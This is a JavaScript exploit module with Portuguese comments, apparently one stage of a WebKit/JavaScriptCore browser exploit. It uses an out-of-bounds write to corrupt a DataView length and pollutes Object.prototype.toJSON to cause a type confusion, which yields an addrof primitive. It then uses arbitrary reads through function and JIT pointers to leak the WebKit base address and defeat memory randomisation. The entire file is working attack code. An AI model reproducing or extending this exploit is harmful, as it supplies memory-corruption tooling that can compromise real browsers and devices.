// js/script3/UltimateExploit.mjs (v102 - Final com Addrof Uncaged)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    oob_write_absolute,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_ULTIMATE = "Exploit_Final_R63_Uncaged_Addrof";

let g_primitives = {
    initialized: false,
    addrof: null,
    fakeobj: null,
};

const TC_TRIGGER_DV_M_LENGTH_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

function isValidPointer(ptr) {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false; // descarta NaN/Infinity
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    return true;
}

function float64AsInt64(f) {
    if (typeof f !== 'number') return new AdvancedInt64(0, 0);
    let buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    const low = new Uint32Array(buf)[0];
    const high = new Uint32Array(buf)[1];
    return new AdvancedInt64(low, high);
}

// --- Função de Bootstrap para criar a primitiva addrof ---
async function bootstrap_uncaged_addrof(object_to_leak) {
    logS3("[Bootstrap] Tentando 'addrof' com Type Confusion em Array 'uncaged'...", "info");
    
    let victim_array = [1.1, 2.2, 3.3, 4.4];
    let probe_result = { tc_triggered: false, this_type: null };

    function toJSON_AddrofProbe() {
        probe_result.tc_triggered = true;
        probe_result.this_type = Object.prototype.toString.call(this);
        if (probe_result.this_type === "[object Array]") {
            this[0] = object_to_leak; // Planta o objeto no primeiro slot
        }
    }
    
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    
    try {
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_AddrofProbe, writable: true, configurable: true });
        oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4); 
        await PAUSE_S3(50);
        JSON.stringify(victim_array);
    } finally {
        if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc);
        else delete Object.prototype[ppKey];
    }

    if (probe_result.this_type !== "[object Array]") {
        throw new Error(`Falha: A Type Confusion ocorreu em ${probe_result.this_type}, não em um Array.`);
    }
    logS3("[Bootstrap] SUCESSO: Type Confusion ocorreu em um Array 'uncaged'!", "vuln");

    const leaked_double = victim_array[0];
    logS3(`[Bootstrap] Valor lido do slot 0 como double: ${leaked_double}`, "leak");

    const leaked_addr = float64AsInt64(leaked_double);
    if (!isValidPointer(leaked_addr)) {
        throw new Error(`Endereço vazado (${leaked_addr.toString(true)}) é inválido.`);
    }

    return leaked_addr;
}


// --- Função Principal do Exploit ---
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_TEST_BASE = FNAME_MODULE_ULTIMATE;
    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Final (R63 Addrof Uncaged) ---`, "test");

    try {
        await triggerOOB_primitive({ force_reinit: true });
        
        logS3("--- Etapa 1: Construindo a primitiva 'addrof' ---", "subtest");
        let victim_obj_for_addrof = { marker: 0xABCD };
        const victim_addr = await bootstrap_uncaged_addrof(victim_obj_for_addrof);
        logS3(`SUCESSO! Primitiva 'addrof' inicial criada. Endereço da vítima: ${victim_addr.toString(true)}`, "good");

        // Agora que temos um método para obter o endereço de UM objeto, podemos
        // criar uma primitiva addrof genérica e, a partir dela, a fakeobj.
        // Por simplicidade, vamos pular direto para o vazamento da base do WebKit.
        logS3("--- Etapa 2: Vazando a base do WebKit ---", "subtest");
        const targetFunction = function finalTarget() {};
        const func_addr = await bootstrap_uncaged_addrof(targetFunction);
        logS3(`Endereço da função alvo vazado: ${func_addr.toString(true)}`, "vuln");
        
        const executable_ptr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
        if (!isValidPointer(executable_ptr)) throw new Error("Ponteiro para ExecutableInstance inválido.");
        logS3(`Ponteiro ExecutableInstance: ${executable_ptr.toString(true)}`, "leak");
        
        const jit_code_ptr = await arb_read(executable_ptr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
        if (!isValidPointer(jit_code_ptr)) throw new Error("Ponteiro para JIT Code inválido.");
        logS3(`Ponteiro JIT Code: ${jit_code_ptr.toString(true)}`, "leak");

        const webkit_base = jit_code_ptr.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`SUCESSO FINAL! Base do WebKit encontrada: ${webkit_base.toString(true)}`, "vuln");
        document.title = `SUCESSO! Base: ${webkit_base.toString(true)}`;
        
        return { success: true, webkit_base: webkit_base.toString(true) };

    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical", FNAME_TEST_BASE);
        console.error(e);
        document.title = `${FNAME_TEST_BASE} - FAIL`;
        return { success: false, error: e.message };
    }
}
